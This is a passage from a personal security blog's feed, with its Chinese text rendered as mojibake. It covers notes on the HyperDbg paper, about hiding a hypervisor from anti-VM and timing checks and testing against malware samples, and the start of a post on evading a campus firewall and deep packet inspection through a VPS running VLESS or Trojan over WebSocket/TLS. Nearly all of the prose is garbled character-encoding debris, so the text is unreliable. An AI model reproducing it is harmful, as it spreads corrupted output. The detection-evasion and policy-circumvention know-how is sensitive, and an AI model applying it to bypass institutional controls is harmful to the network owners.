çš„ä¸€ä¸ªç¼“å†²åŒºä»¥ä¾›æ‰§è¡Œï¼Œä¹‹åä¸€ä¸ªç¼“å†²åŒºé€æ¸è¢«ç”¨æ‰§è¡Œç»“æœå¡«å……å¹¶ä¼ è¾“å› hostï¼›è¿™ç§æ–¹æ³•ä¸ç”¨åœ¨å•†ä¸šè°ƒè¯•å™¨ï¼ˆå‘½ä»¤ä¸è„šæœ¬è¢«é€è¡Œå‘é€ä¸è§£æï¼‰ä¸­çš„é€šè¿‡å‘é€æ•´ä¸ªè„šæœ¬åˆ° VMX-root mode å¹¶é€šè¿‡å•å‘æµå“åº”å›ç”¨æˆ·æ¨¡å¼çš„ä¼ ç»Ÿçš„åŒå‘æ–¹æ³•ç›¸æ¯”æä¾›äº†è¾ƒå¤§çš„æ€§èƒ½æå‡</p><h1 id="0x06-TRANSPARENCY-ANALYSIS"><a href="#0x06-TRANSPARENCY-ANALYSIS" class="headerlink" title="0x06. TRANSPARENCY ANALYSIS"></a>0x06. TRANSPARENCY ANALYSIS</h1><p>æœ¬èŠ‚ç”¨æ¶æ„è½¯ä»¶åˆ†æ HYPERDBG çš„é€æ˜æ€§</p><h2 id="6-1-Hypervisor-Detection-Methods-and-Mitigations"><a href="#6-1-Hypervisor-Detection-Methods-and-Mitigations" class="headerlink" title="6.1 Hypervisor Detection Methods and Mitigations"></a>6.1 Hypervisor Detection Methods and Mitigations</h2><p>æ£€æµ‹å­æ“ä½œç³»ç»Ÿç¬¬ä¸‰æ–¹ç¨‹åºï¼ˆå¦‚ hypervisorï¼‰é€šè¿‡æŸ¥è¯¢ä¸€ç»„æŒ‡ç¤ºæ€§çš„æŒ‡çº¹ï¼Œå¦‚æ³¨å†Œè¡¨é¡¹ã€ç³»ç»Ÿè°ƒç”¨ï¼ˆä¾‹å¦‚æŸ¥æ‰¾è¿è¡Œçš„è¿›ç¨‹ä¸åŠ è½½çš„é©±åŠ¨ï¼‰ã€æŒ‡ä»¤ï¼ˆå¦‚ <code>CPUID/IDT/LDT</code> ï¼‰ï¼ŒHYPERDBG æ‹¦æˆªå¹¶å¼ºåˆ¶ VM-exitï¼Œæ¨¡æ‹Ÿå¯¹åº”çš„éè™šæ‹ŸåŒ–ç¯å¢ƒçš„æ­£å¸¸å€¼æ¥å¯¹æŠ—ï¼Œè¡¨ 1 æä¾›äº†æ­¤ç±»æ–¹æ³•çš„ç»¼åˆé¢„è§ˆï¼›æ›´å¤æ‚çš„ VM æ£€æµ‹æ–¹æ³•åˆ©ç”¨æ—¶é—´ä¾§ä¿¡é“ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ç‰¹å®šæŒ‡ä»¤ï¼ˆå¦‚ <code>CPUID/GETSEC/INVD/XSETB</code> ï¼‰ä¼šé€ æˆ VM-exit è€Œæ‰§è¡Œæ—¶é—´æ›´é•¿ï¼Œåˆ—è¡¨ 2 å±•ç¤ºäº†æ­¤ç±»æ”»å‡»çš„ç¤ºä¾‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†æè¿° HYPERDBG å¦‚ä½•å¯¹æŠ—æ­¤ç±»æ£€æµ‹æ–¹æ³•</p><p><img src="https://s2.loli.net/2024/10/07/LbpTxDqA8gYW5ul.png" alt="Table 1: Anti-Debugging and Anti-VM exercises and mitigation in HyperDbg"></p><h2 id="6-2-Timing-Transparency-in-HYPERDBG"><a href="#6-2-Timing-Transparency-in-HYPERDBG" class="headerlink" title="6.2 Timing Transparency in HYPERDBG"></a>6.2 Timing Transparency in HYPERDBG</h2><p>HYPERDBG çš„é€æ˜æ¨¡å¼ä¸ºéšè—è™šæ‹ŸåŒ–æ—¶é—´æ³„æ¼æä¾›äº†ä¸€ç§é€šè¿‡è¯†åˆ«æ£€æµ‹ VM çš„åºåˆ—å¹¶å°†æ—¶é—´å€¼æ›¿æ¢ä¸ºéè™šæ‹ŸåŒ–ç³»ç»Ÿçš„è§£å†³æ–¹æ¡ˆï¼Œæ®ä½œè€…æ‰€çŸ¥ HYPERDBG æ˜¯ç¬¬ä¸€ä¸ªæä¾›äº†ä¿®æ”¹åˆ†æè½¯ä»¶ç”¨ä»¥æ£€æµ‹è™šæ‹ŸåŒ–ç¯å¢ƒçš„æ—¶é—´æŒ‡çº¹çš„å®ç”¨æ‰‹æ®µçš„è°ƒè¯•å™¨ï¼Œé€šè¿‡ä½¿ç”¨æ‰§è¡Œæ—¶é—´çš„ç»Ÿè®¡æ¨¡å‹ï¼Œå¹¿æ³›æ—¶é—´åˆ†æè¢«åœ¨ VMM æ¨¡å—å¯åŠ¨å‰æ‰§è¡Œï¼Œä»¥å°½å¯èƒ½æ¥è¿‘ Guest OS çš„æ­£å¸¸è¿è¡Œæ¡ä»¶çš„æ—¶é—´æˆ³</p><p>ä½œè€…ä½¿ç”¨äºŒé¡¹é«˜æ–¯åˆ†å¸ƒï¼ˆtwo-term Gaussian Distributionï¼‰ä½œä¸ºå›å½’å‡½æ•°ï¼ˆregressor functionï¼‰ï¼Œå› ä¸ºå®éªŒè¡¨æ˜å…¶éå¸¸é€‚åˆå¯¹æ­¤ç±»æ‰§è¡Œæ—¶é—´è¿›è¡Œå»ºæ¨¡ï¼Œå›¾ 5 æ˜¾ç¤ºäº†åœ¨å¯ç”¨ä¸ä¸å¯ç”¨ HyperDbg çš„æƒ…å†µä¸‹è¿è¡Œåˆ—è¡¨ 2 ä¸­åºåˆ—çš„ 10k æ¬¡æ‰§è¡Œçš„æµ‹é‡ç»“æœçš„æ¦‚ç‡åˆ†å¸ƒå‡½æ•°ï¼ˆProbability Distribution Functionï¼‰ï¼Œè¿™äº›å€¼å¯ä»¥è¢«å¯¼å‡ºä¸”ç»Ÿè®¡å‚æ•°å¯ä»¥è¢«è®°å½•ç”¨äºæ¨¡æ‹Ÿç›®çš„</p><p><img src="https://s2.loli.net/2024/10/07/3fPpcDxsWkM68ma.png" alt="Listing 2: The timing measurement code by forcing VM-exit"></p><p><img src="https://s2.loli.net/2024/12/03/ZEgfdNcimw5xtr9.png" alt="Figure 5: PDF distribution of timing measurement for deactivated HyperDbg (a), with activated HyperDbg (b)"></p><p>HyperDbg ç›®å‰å…è®¸é€šè¿‡ä¸¤ç§æ–¹æ³• cover æ‰ VM çš„æ—¶é—´æ³„æ¼ï¼š</p><ul><li>1ï¼‰è°ƒæ•´è·Ÿè¸ª CPU æ—¶é—´çš„ MSR å¯„å­˜å™¨ï¼ˆç§°ä¸º <code>IA32_TIME_STAMP_COUNTER</code>ï¼‰ï¼Œæ— éœ€ VM-Exit ä½†ä¼šå¢åŠ ç³»ç»Ÿä¸ç¨³å®šæ€§</li><li>2ï¼‰æ¨¡æ‹Ÿ <code>RDTSC</code> ä¸ <code>RDTSCP</code> æŒ‡ä»¤çš„ç»“æœï¼Œéœ€è¦ VM-Exit å› æ­¤å¼•å…¥é¢å¤–å¤æ‚åº¦</li></ul><p>æ—¶åºæŒ‡ä»¤çš„å…¨å±€æ¨¡æ‹Ÿä¼šå¹²æ‰°ç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½ï¼ˆä½œè€…åœ¨å±å¹•é©±åŠ¨ä¸éŸ³é¢‘è¾“å‡ºä¸Šè¿›è¡Œäº†å®éªŒè¯æ˜ï¼‰</p><h2 id="6-3-Alternative-Timing-Attack-Methods"><a href="#6-3-Alternative-Timing-Attack-Methods" class="headerlink" title="6.3 Alternative Timing Attack Methods"></a>6.3 Alternative Timing Attack Methods</h2><p>HyperDbg è¿˜æœ‰ä¸€äº›æ–¹æ³•èƒ½é˜»ç¢æ¶æ„è½¯ä»¶ç”¨å„ç§ç±»å‹çš„è®¡æ—¶æ”»å‡»æ¢æµ‹æ—¶é—´ï¼Œå¦‚åœ¨ HyperDbg ä¸­æœ‰å¯¹ shared ticks ä¸ç¡¬ä»¶æ€§èƒ½ç›‘è§†è®¡æ•°å™¨ï¼ˆRDPMCï¼‰çš„å†…ç½®æ”¯æŒ</p><h1 id="0x07-EVALUATION"><a href="#0x07-EVALUATION" class="headerlink" title="0x07. EVALUATION"></a>0x07. EVALUATION</h1><h2 id="7-1-Transparency-Evaluation"><a href="#7-1-Transparency-Evaluation" class="headerlink" title="7.1 Transparency Evaluation"></a>7.1 Transparency Evaluation</h2><p>ä½œè€…åœ¨æä¾›äº†åè°ƒè¯•å‹åŠ›æµ‹è¯•çš„å·¥å…· <a href="https://github.com/a0rtega/pafish">pafish</a> ä¸ <a href="https://github.com/ayoubfaouzi/al-khaser">al-khaser</a> ä¸Šè¯„ä¼°äº† HyperDbg çš„é€æ˜æ¨¡å¼ï¼Œå¦‚ä½œè€…æ‰€æ–™ï¼Œç¬¬ä¸€ç§æ–¹æ³•ï¼ˆæ›´æ–° <code>IA32_TIME_STAMP_COUNTER</code>ï¼‰ ä¼šå¹²æ‰°ç³»ç»Ÿä¸»è¦åŠŸèƒ½ï¼Œè€Œç¬¬äºŒç§æ–¹æ³•ï¼ˆæ¨¡æ‹Ÿï¼‰åˆ™æˆåŠŸé€šè¿‡è¿™äº›å·¥å…·ï¼Œä½œè€…è¿˜åœ¨å¸¸è§åè°ƒæ–¹æ³•ä¸å•†ç”¨è½¯ä»¶ä¸Šè¯„ä¼°äº† HyperDbg</p><h3 id="7-1-1-Evaluation-Configuration"><a href="#7-1-1-Evaluation-Configuration" class="headerlink" title="7.1.1 Evaluation Configuration"></a>7.1.1 Evaluation Configuration</h3><p>ä½œè€…åœ¨ä¸åŒç±»åˆ«çš„ 10853 ä¸ªæ¶æ„è½¯ä»¶æ ·æœ¬ä¸Šåˆ†æï¼Œåˆ†åˆ«åœ¨ HyperDbg çš„æ™®é€šæ¨¡å¼ä¸é€æ˜æ¨¡å¼è¿›è¡Œæµ‹è¯•ï¼Œå¹¶ä¸ x64dbg ä¸ WinDbg å¯¹æ¯”ï¼Œç³»ç»Ÿä¸º Windows 20H1ï¼›ä½œè€…ä½¿ç”¨ C&#x2F;S æ¨¡å¼åˆ†å‘æ ·æœ¬ï¼Œå¹¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¢å¤ç³»ç»Ÿï¼šåŸºäº <a href="https://dl.acm.org/doi/10.1145/2076732.2076790">Barebox</a> çš„æ— éœ€é‡å¯çš„æ–¹æ³•ä¸åŸºäº Windows ç³»ç»Ÿè¿˜åŸçš„æ–¹æ³•</p><p>**Barebox-based Approach **ï¼šä½œè€…é¦–å…ˆä½¿ç”¨åŸºäº Barebox çš„æ–¹æ³•</p><h3 id="7-1-2-Evaluation-by-Anti-Debugging-VM-and-Hypervisor"><a href="#7-1-2-Evaluation-by-Anti-Debugging-VM-and-Hypervisor" class="headerlink" title="7.1.2 Evaluation by Anti-Debugging, -VM, and -Hypervisor"></a>7.1.2 Evaluation by Anti-Debugging, -VM, and -Hypervisor</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;çŒ«çŒ«å¸®ä½ è°ƒè¯•ç¨‹åºï¼ŒçŒ«å¥½ï¼Œäººç±»å¥´å½¹çŒ«çŒ«ï¼Œäººå&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x02ã€‘å¦‚ä½•åœ¨æ¾³æ´²æ ¡å›­ç½‘å†…ç©åŸç¥</title>
    <link href="https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/"/>
    <id>https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/</id>
    <published>2024-08-30T15:46:31.000Z</published>
    <updated>2024-11-11T10:50:18.866Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªåŸç¥å•Šï¼Œèƒ½å¿ä½ä¸€ç§’ä¸ç©çš„éƒ½æ˜¯ç¥äººäº†</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>æ³¨ï¼šæœ¬æ–‡ <strong>ä»…</strong> æ¶‰åŠ<strong>æ¾³æ´²å¤§å­¦æ ¡å›­</strong>çš„ç½‘ç»œç›¸å…³çŠ¶å†µï¼ ï¼ï¼<strong>ä¸æ¶‰åŠä¹Ÿä¸é€‚ç”¨ä»»ä½•æ¾³æ´²å¢ƒå¤–çš„ä»»ä½•ç›¸å…³æˆ–æ— å…³åœºæ™¯ï¼ï¼ï¼</strong></p></blockquote><p>ä¼—æ‰€å‘¨çŸ¥ç¬”è€…ç°åœ¨åœ¨å—åŠçƒğŸ‡¦ğŸ‡ºçš„æŸæ‰€ä¸çŸ¥åå¤§å­¦è¯» PhD <del>æ‘†çƒ‚</del> å½“ä¸­ï¼Œè™½ç„¶è¯´æ—¥å¸¸ç•…æ¸¸ GitHub ä¸€ç±»çš„ç½‘ç«™æ²¡æœ‰å•¥é—®é¢˜ï¼Œä½†æ˜¯éå¸¸å¥‡æ€ªçš„æ˜¯æ ¡å›­ç½‘å½“ä¸­å±…ç„¶ä¹Ÿå­˜åœ¨ç½‘ç«™å°é”ï¼Œä¾‹å¦‚ <a href="https://www.taobao.com/">æ·˜å®</a> è¿™æ ·çš„ä¸­å›½è´­ç‰©ç½‘ç«™å°±æ˜¯ä¸Šä¸å»çš„ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/TGRC8irBDyFcmaZ.png"></p><blockquote><p>åŒ…æ‹¬åŸç¥ä¹Ÿä¸Šä¸å»ï¼ŒğŸ‘´å¾ˆæ„¤æ€’ğŸ’¢</p></blockquote><p>è™½ç„¶è¯´ <em>åœ¨å­¦æ ¡å°±è¯¥æ­£ç»æç§‘ç ”</em> ï¼Œä½†æ˜¯ç¬”è€…è¿˜æ˜¯ä¸å¤ªèƒ½å¿å—å¾—äº†å­¦æ ¡å†…å„ç§ç½‘ç»œå°é”çš„å­˜åœ¨ï¼Œå°¤å…¶æ˜¯åœ¨ç¬”è€… <em>å»å¹´åˆšæ¥é‚£ä¼šåœ¨æ ¡å›­ç½‘å†…è¿ QQ éƒ½ç™»ä¸ä¸Šï¼Œåªèƒ½ç”¨é£ä¹¦èŠå¤©</em> ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/Nj3H5k7J4sbzQ6l.png"></p><p>æ€»è€Œè¨€ä¹‹ç›¸å½“æ•°é‡çš„ç½‘ç«™ <del>å°¤å…¶æ˜¯åŸç¥</del> éƒ½ä¸Šä¸å»ï¼Œå¯¹ç¬”è€…çš„ç”Ÿæ´»é€ æˆäº†ä¸å°çš„å½±å“ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/W37A2zSiabJNnC1.png"></p><p>å› æ­¤ç¬”è€…å†³å®šé€šè¿‡ä¸€äº›æˆç†Ÿçš„ç½‘ç»œç­–ç•¥ï¼Œåœ¨å…¬æœ‰äº‘ä¸Šè´­ä¹°æœåŠ¡å™¨åšä»£ç†å¹¶æ¶è®¾ä¸€å®šçš„ç½‘ç»œåŸºç¡€æ¶æ„ï¼Œä»¥åœ¨å­¦æ ¡å†…ä¹Ÿèƒ½å¤Ÿé‡æ–°ç™»å…¥ä¸€äº›ç¬”è€…è¿˜åœ¨ä¸­å›½å¤§é™†çš„æ—¶å€™å¸¸ç”¨çš„ä¸€äº›ç½‘ç«™ ï¼š ï¼‰ <del>æ¯”å¦‚ç©åŸç¥</del></p><blockquote><p>æ³¨ï¼šç¬”è€…ç°åœ¨å¼€å§‹é€æ¸æ„Ÿè§‰è‡ªå·±çš„ä¸­æ–‡è¡¨è¾¾èƒ½åŠ›ä¼¼ä¹åœ¨æ…¢æ…¢åœ°æœ‰æ‰€ä¸‹é™äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼š(</p></blockquote><h1 id="0x01-æ–¹æ¡ˆè®¾è®¡ä¸å‡†å¤‡å·¥ä½œ"><a href="#0x01-æ–¹æ¡ˆè®¾è®¡ä¸å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01. æ–¹æ¡ˆè®¾è®¡ä¸å‡†å¤‡å·¥ä½œ"></a>0x01. æ–¹æ¡ˆè®¾è®¡ä¸å‡†å¤‡å·¥ä½œ</h1><p>è¿™ä¸€èŠ‚ç®€å•è®²ä¸€è®²åŸºæœ¬åŸç†ï¼Œä»¥åŠç¬”è€…æœ€ç»ˆçš„æ–¹æ¡ˆè®¾è®¡ï¼š ï¼‰</p><blockquote><p>è¿™ä¸€éƒ¨åˆ†å¯èƒ½è®²å¾—ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œå› ä¸ºç¬”è€…ä¹Ÿä¸å¤ªæ‡‚ï¼Œ<del>æœ‰ç‚¹æ„§å¯¹ç½‘å®‰å®éªŒç­å‡ºèº«â€¦</del></p></blockquote><h2 id="Pre-ç½‘ç»œä»£ç†"><a href="#Pre-ç½‘ç»œä»£ç†" class="headerlink" title="Pre. ç½‘ç»œä»£ç†"></a>Pre. ç½‘ç»œä»£ç†</h2><p><strong>ä»£ç†</strong> ï¼ˆProxyï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„æœåŠ¡ï¼Œç®€å•æ¥è¯´å°±æ˜¯åœ¨è¿›è¡Œäº’è”ç½‘é€šä¿¡æ—¶å®¢æˆ·ç«¯ä¸ç›´æ¥å‘ç›®æ ‡ä¸»æœºå‘é€ç½‘ç»œè¯·æ±‚ï¼Œè€Œæ˜¯å…ˆæŠŠè¯·æ±‚å‘é€ç»™ä»£ç†æœåŠ¡å™¨ï¼Œç”±ä»£ç†æœåŠ¡å™¨å‘é€ç»™ç›®æ ‡ä¸»æœºï¼Œå¹¶æ¥å—å“åº”æ•°æ®å†è½¬å‘ç»™å®¢æˆ·ç«¯ï¼Œè¿™ä¹Ÿå« <strong>æ­£å‘ä»£ç†</strong> ï¼ˆForward Proxyï¼‰</p><p><img src="https://s2.loli.net/2024/09/11/5HqDEysJgb7eLdn.png"></p><p>ç›¸åº”åœ°ï¼Œæœ‰æ­£å‘å°±æœ‰åå‘ï¼Œ <strong>åå‘ä»£ç†</strong> ï¼ˆReverse Proxyï¼‰ä¸»è¦æ˜¯åœ¨æœåŠ¡ç«¯ä¾§ï¼Œå…¶è´Ÿè´£å°†å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚è½¬å‘ç»™çœŸæ­£çš„æœåŠ¡ç«¯</p><p><img src="https://s2.loli.net/2024/09/11/57pIuhJ6PHQaY1w.png"></p><blockquote><p>ä¾‹å¦‚ <a href="https://nginx.org/en/">NGINX</a> ä¾¿æ˜¯ä¸€ä¸ªéå¸¸æœ‰åçš„æœ‰ç€åå‘ä»£ç†åŠŸèƒ½çš„ Web æœåŠ¡å™¨è½¯ä»¶</p><p><img src="https://s2.loli.net/2024/09/11/q5o1EeXMIdwxGNH.png"></p></blockquote><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæœ‰äº†ä»£ç†æœåŠ¡å™¨çš„å­˜åœ¨ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å°†ç½‘ç»œè¯·æ±‚å‘é€ç»™ä»£ç†æœåŠ¡å™¨ï¼Œè®©ä»£ç†æœåŠ¡å™¨æ›¿ä»£æˆ‘ä»¬è¿›è¡Œå®é™…çš„ç½‘ç»œè¯·æ±‚ï¼Œç”±äºæˆ‘ä»¬çš„ä»£ç†æœåŠ¡å™¨å¹¶ä¸åœ¨é˜²ç«å¢™é™åˆ¶çš„ç½‘ç«™&#x2F;IPåˆ—è¡¨å½“ä¸­ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½å€ŸåŠ©ä»£ç†æœåŠ¡å™¨è®¿é—®è¢«é˜²ç«å¢™æ‰€ç¦æ­¢è®¿é—®çš„ç½‘ç»œæœåŠ¡ï¼Œ <del>ä¾‹å¦‚è®©ğŸ‘´åœ¨æ ¡å›­ç½‘ç©åŸç¥</del></p><p><img src="https://s2.loli.net/2024/09/11/7PhaTAnFjBvLJGM.png" alt="ä¾‹å¦‚æ¬§ç¾å›½å®¶æœ‰çš„å­¦æ ¡ä¼šæŠŠ Facebook ç»™å¢™äº†ï¼Œåˆ©ç”¨ä»£ç†å°±èƒ½ä¸Š Facebook"></p><h2 id="Pre-ä¿¡é“åŠ å¯†ä¸åŒ…æ£€æµ‹å¯¹æŠ—"><a href="#Pre-ä¿¡é“åŠ å¯†ä¸åŒ…æ£€æµ‹å¯¹æŠ—" class="headerlink" title="Pre. ä¿¡é“åŠ å¯†ä¸åŒ…æ£€æµ‹å¯¹æŠ—"></a>Pre. ä¿¡é“åŠ å¯†ä¸åŒ…æ£€æµ‹å¯¹æŠ—</h2><p>ä½†æ˜¯æœ‰äº†ä»£ç†æœåŠ¡å™¨å¹¶ä¸ä»£è¡¨æˆ‘ä»¬å°±èƒ½ç›´æ¥åœ¨æ¾³æ´²æ ¡å›­ç½‘é‡Œç•…ç©åŸç¥äº†ï¼Œéƒ¨åˆ†é˜²ç«å¢™ä¼šå¯¹ä¼ è¾“çš„æ•°æ®åŒ…è¿›è¡Œæ£€æµ‹ï¼Œä¾‹å¦‚ä¼ ç»Ÿçš„ HTTP å’Œ SOCKS5 ä»£ç†éƒ½æ˜¯éåŠ å¯†çš„ï¼Œæ— è®ºæ˜¯ç›®çš„åœ°è¿˜æ˜¯å†…å®¹éƒ½å¾ˆå®¹æ˜“ä¾¿èƒ½è¢«æ£€æµ‹å‡ºæ¥ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/YkH1SPdZygBhrM5.png"></p><p>å¦‚ä½•å¯¹æŠ—å„ç§åŒ…æ£€æµ‹æŠ€æœ¯ï¼Ÿæœ€ç®€å•çš„æ–¹æ³•è‡ªç„¶æ˜¯ç»™æ•°æ®åŒ…è¿›è¡ŒåŠ å¯†ä¸æ··æ·†ï¼Œä»è€Œä½¿å¾—é˜²ç«å¢™æ— æ³•æ£€æµ‹å‡ºè¿™äº›æµé‡çš„çœŸæ­£ç›®çš„ï¼Œä¾‹å¦‚ä½¿ç”¨ Shadowsocksã€Trojan ç­‰åŠ å¯†åè®®æ¥éšè—ä»£ç†æµé‡çš„ç‰¹å¾ï¼Œæˆ–æ˜¯ä¸ä»£ç†æœåŠ¡å™¨ä¹‹é—´ç»„å»º VPNï¼Œé€šè¿‡ VPN é—´å»ºç«‹çš„åŠ å¯†ä¿¡é“æ¥ä¿æŠ¤æµé‡éšç§ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/Ph1xRkJBMf65UEs.png"></p><p>ä½†æ­£æ‰€è°“é“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼Œè¿™äº›åŠ å¯†åè®®ç»ˆç©¶ <strong>å­˜åœ¨ä¸€äº›ç‰¹æ®Šçš„å†…å®¹æˆ–æ˜¯è¡Œä¸ºç‰¹å¾</strong> ï¼Œä¾‹å¦‚ VMess åè®®å¯ä»¥é€šè¿‡é‡æ”¾æ”»å‡»çš„æ–¹å¼è¿›è¡Œåˆ¤å®šï¼Œæ­¤å¤– <strong>æ·±åº¦åŒ…æ£€æµ‹æŠ€æœ¯</strong> ï¼ˆDeep Packet Inspectionï¼‰ä¼šåœ¨ä¼ ç»Ÿçš„å¯¹æ•°æ®åŒ…è¯·æ±‚å¤´è¿›è¡Œæ£€æµ‹çš„åŸºç¡€ä¹‹ä¸Šå†å¯¹æ•°æ®åŒ…çš„å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå‘ç°äº†ç›¸åº”çš„æŒ‡çº¹ç‰¹å¾ï¼Œä¾¿ä¼šè¿›è¡Œé˜»æ–­ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/khVOWTJKSPdzbNo.png"></p><blockquote><p>è®¸å¤šç½‘ç»œè®¾å¤‡ã€ç¡¬ä»¶é˜²ç«å¢™å‚å•†éƒ½æœ‰æ”¯æŒ DPI çš„äº§å“ï¼Œä¾‹å¦‚ Advantech å®¶çš„ <a href="https://www.advantech.com/en-us/resources/case-study/33a34926-ded6-4cb1-a357-21de674c2200">FWA-6520</a></p><p><img src="https://s2.loli.net/2024/09/11/X7TPaKLUbilQFh9.png"></p></blockquote><p>ä½†æ˜¯æ·±åº¦åŒ…æ£€æµ‹ç­‰æŠ€æœ¯ç»ˆç©¶ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œé’ˆå¯¹ Shadowsocks è¿™ç§éä¸»æµåè®®è¿›è¡Œé˜»æ–­ä¸ä¼šå¯¹æ­£å¸¸é€šä¿¡é€ æˆå¤ªå¤§å½±å“ï¼Œä½†æ˜¯è‹¥æ˜¯é˜²ç«å¢™è¿æœ€å¸¸è§çš„åŠ å¯†æµé‡ç±»å‹éƒ½æ‹¦æˆªåˆ™ä¼šç›´æ¥å½±å“æ­£å¸¸çš„ç½‘ç»œé€šä¿¡ï¼Œä¾‹å¦‚ TLS ï¼ˆTransport Layer Securityï¼‰åè®®æ˜¯ä¸€ç§å¹¿æ³›é‡‡ç”¨çš„å®‰å…¨æ€§åè®®ï¼ŒHTTPS ä¾¿æ˜¯ <code>HTTP over TLS</code> ï¼ŒWebsocket åˆ™å…è®¸æˆ‘ä»¬åœ¨ HTTP åè®®ä¸Šå»ºç«‹å…¨åŒå·¥çš„é€šä¿¡ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ä½¿ç”¨ HTTPS è¿›è¡Œé€šä¿¡ï¼Œæˆ–æ˜¯é€šè¿‡ Websocket over TLS æˆ‘ä»¬ä¾¿èƒ½å°†ä»£ç†æµé‡ä¼ªè£…æˆæ™®é€šçš„ Web åº”ç”¨çš„æµé‡ï¼Œå†…éƒ¨å†ä½¿ç”¨ <a href="https://xtls.github.io/en/config/outbounds/vless.html">VLESS</a> ã€<a href="https://github.com/trojan-gfw/trojan">Trojan</a> ç­‰åè®®è¿›è¡Œä»£ç†ï¼Œä»è€Œè½»æ¾æ¬ºéª—è¿‡å­¦æ ¡çš„é˜²ç«å¢™</p><blockquote><p>ä»¥å‰è¿˜æœ‰ä½¿ç”¨ TLS over TLS çš„ï¼Œä¸è¿‡è¿™æ ·æ®è¯´æµé‡å°±åˆå‘ˆç°å‡ºå¯è¢«æ£€æµ‹çš„ç‰¹å¾äº†ï¼š(</p><p>ä½†æ˜¯ä¸¤å±‚ TLS å…¶å®å¹¶éä¸å¸¸è§ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬ä½¿ç”¨åŸºäº TLS çš„ä»£ç†æµè§ˆ HTTPS ç½‘ç«™æ—¶ï¼Œå¤–å±‚æ˜¯ TLS ä»£ç†ï¼Œå†…å±‚æ˜¯ç½‘ç«™çš„ TLSï¼Œç”±æ­¤ä¾¿åˆæœ‰äº†ä¸¤å±‚æ•´åˆæˆä¸€å±‚çš„ <a href="https://xtls.github.io/">XTLS</a> </p></blockquote><h2 id="Pre-VPS-è´­ä¹°"><a href="#Pre-VPS-è´­ä¹°" class="headerlink" title="Pre. VPS è´­ä¹°"></a>Pre. VPS è´­ä¹°</h2><p>ç¬”è€…åœ¨ Vultr ä¸Šä¹°äº†ä¸€å° Singapore çš„ VPSï¼Œ6 USD æ¯æœˆï¼Œé€‰æ‹© Singapore ä¸»è¦çš„åŸå› æ˜¯ç¦»å›½å†…æ¯”è¾ƒè¿‘è®¿é—®å›½å†…ç½‘ç«™ä¼šæ¯”è¾ƒæ–¹ä¾¿ï¼Œé€‰ Vultr çš„ä¸»è¦åŸå› åˆ™æ˜¯å› ä¸ºå¯ä»¥éšæ—¶æš‚åœè®¡è´¹ï¼Œæ–¹æ¡ˆæ¯”è¾ƒçµæ´»çš„åŒæ—¶ä»·æ ¼ä¹Ÿè¿˜ç®—å®æƒ </p><blockquote><p>åƒ banwagong è¿™æ ·çš„è€ç‰Œ VPS å¹¶ä¸é€‚åˆç¬”è€…ï¼Œæ€»ä¸èƒ½æµé‡åŒ…å…ˆä»æ¾³æ´²è·‘ä¸€è¶Ÿç¾å›½å†è·‘å›å›½å†…å†åŸè·¯è¿”å›æ¾³æ´²å§ï¼Œé‚£æ ·å»¶è¿Ÿå°±ä¸Šå¤©äº†ï¼Œå¯¹ç¬”è€…è€Œè¨€æœ€ä¼˜é€‰æ‹©è¿˜æ˜¯æ•°æ®åŒ…çº¿è·¯èƒ½å°½é‡å’Œå›½å†…å½¢æˆä¸€æ¡ç›´çº¿ï¼š ï¼‰</p></blockquote><p><img src="https://s2.loli.net/2024/09/11/s1GDHYUCQ7IVWEB.png"></p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœä½ åªæ˜¯çº¯ç²¹çš„ VPS çˆ±å¥½è€…ï¼Œå•çº¯æƒ³éšä¾¿ä¹°ç‚¹ VPS æ¥ç©ç©ï¼Œç¬”è€…ä¹Ÿæœ‰ä¸€äº›éå¸¸éå¸¸ä¾¿å®œçš„ VPS å¯ä»¥æ¨èï¼Œä¾‹å¦‚ Cloudcone çš„ <a href="https://app.cloudcone.com.cn/vps/263/create?token=cc-turns-7-cs-2">10åˆ€ä¸€å¹´çš„å° VPS</a>  æˆ–æ˜¯ <a 